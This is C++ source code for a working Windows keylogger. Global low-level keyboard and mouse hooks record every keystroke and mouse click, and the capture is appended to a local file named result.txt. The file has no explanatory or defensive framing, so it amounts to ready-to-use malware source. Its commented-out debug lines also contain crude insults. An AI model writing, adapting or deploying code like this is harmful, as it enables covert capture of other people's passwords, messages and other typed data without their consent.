#include<stdio.h>
#include<windows.h>
#include<fstream>


LRESULT keyboardKeyLog(int code, WPARAM wparam, LPARAM lparam){
	
	
//	fptr = fopen("result.txt", "w");
	
	
	
	
	KBDLLHOOKSTRUCT *pkey = (KBDLLHOOKSTRUCT *) lparam;
	if(wparam == WM_KEYDOWN){
		FILE *fptr;
		fptr = fopen("result.txt", "a");
		switch(pkey->vkCode){
//			printf("dnsajidbasi");
			case VK_BACK:
				fprintf(fptr, "[back]\n");
				break;
			case VK_RETURN:
				fprintf(fptr, "[enter]\n");
				break;
			case VK_SPACE:
				fprintf(fptr, "[space]\n");
				break;
//			case WM_LBUTTONDOWN:
//				fprintf(fptr, "leftclick\n");
//				break;
			default:
				fprintf(fptr, "%c", pkey->vkCode);
				break;
			
		}
		fclose(fptr);
		
	}
	
	
//	fclose(fptr);	
	
	return CallNextHookEx(NULL, code, wparam, lparam);
	
}

LRESULT mouseKeyLog(int code, WPARAM wparam, LPARAM lparam){
	
		PMSLLHOOKSTRUCT mouse = (PMSLLHOOKSTRUCT) lparam;
		if(code>=0){
			FILE *fptr;
			fptr = fopen( "result.txt", "a");
			
			switch(wparam){
				
				case WM_LBUTTONDOWN:
					fprintf(fptr, "leftclick\n");
					break;
				case WM_RBUTTONDOWN:
					fprintf(fptr, "rightclick\n");
					break;
				
			}
			
			fclose(fptr);
			
		}
		
		return CallNextHookEx(NULL, code, wparam, lparam);
	
}

//void keylogger(int key){
//	
//	
//	
//	
//	
//}


int main(){
	
	HHOOK hookKeyboard = SetWindowsHookExA(WH_KEYBOARD_LL, keyboardKeyLog, NULL, 0);
	HHOOK hookMouse = SetWindowsHookExA(WH_MOUSE_LL, mouseKeyLog, NULL, 0);
	if(hookKeyboard == NULL || hookMouse == NULL){
		
			printf("hook error");
		
	}
	
//	printf("ur mom");
	MSG msg;
	while((GetMessage(&msg, NULL, 0, 0))!=0){
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	
//	printf("gay");
	
//	fclose(fptr)
	UnhookWindowsHookEx(hookKeyboard);
	UnhookWindowsHookEx(hookMouse);
	
}
